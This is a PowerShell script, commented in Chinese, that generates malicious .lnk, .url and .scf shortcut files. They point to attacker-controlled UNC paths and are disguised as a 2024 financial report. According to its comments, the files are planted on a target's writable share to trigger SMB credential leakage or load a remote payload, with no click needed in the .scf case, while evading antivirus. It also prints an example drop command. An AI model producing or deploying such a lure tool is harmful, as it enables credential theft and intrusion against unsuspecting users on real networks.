# make_lnk.ps1 —— 生成指向 UNC 的 .lnk / .url / .scf（不落 EXE，绕文件查杀）
# 用途：把生成物放入目标的可写共享（如 A3 的 \\192.168.2.3\Public），诱使浏览/双击触发 SMB 认证或拉取载荷
param(
    [Parameter(Mandatory=$true)][string]$Target,       # 例如 '\\192.168.2.20\update\2024年度财务报表汇总.exe'
    [string]$Out = "$Env:ProgramData\SysCache\财务对账.lnk",
    [ValidateSet('lnk','url','scf')][string]$Kind = 'lnk',
    [string]$IconTarget,                               # 图标（可指向 \\LHOST\share\icon.ico 用于触发 SMB 认证）
    [string]$Name = '2024年度财务报表汇总'
)

New-Item -ItemType Directory -Force -Path (Split-Path $Out) | Out-Null

switch ($Kind) {
  'lnk' {
    $ws = New-Object -ComObject WScript.Shell
    $l  = $ws.CreateShortcut($Out)
    $l.TargetPath       = $Target
    $l.WorkingDirectory = Split-Path $Target
    $l.IconLocation     = if ($IconTarget) { "$IconTarget,0" } else { "$env:SystemRoot\system32\shell32.dll,70" }
    $l.Description      = $Name
    $l.WindowStyle      = 1
    $l.Save()
  }
  'url' {
    @"
[InternetShortcut]
URL=$Target
IconIndex=0
IconFile=$(if ($IconTarget) { $IconTarget } else { "$env:SystemRoot\system32\shell32.dll" })
"@ | Set-Content -Path $Out -Encoding ASCII
  }
  'scf' {
    # .scf：资源管理器显示图标时自动解析 IconFile -> 触发 SMB 认证（无需双击）
    @"
[Shell]
Command=2
IconFile=$Target
[Taskbar]
Command=ToggleDesktop
"@ | Set-Content -Path $Out -Encoding ASCII
  }
}
Write-Host "[+] 已生成 $Kind -> $Out"
Write-Host "[i] 目标: $Target"
Write-Host "[i] 投放示例: copy `"$Out`" \\192.168.2.3\Public\"
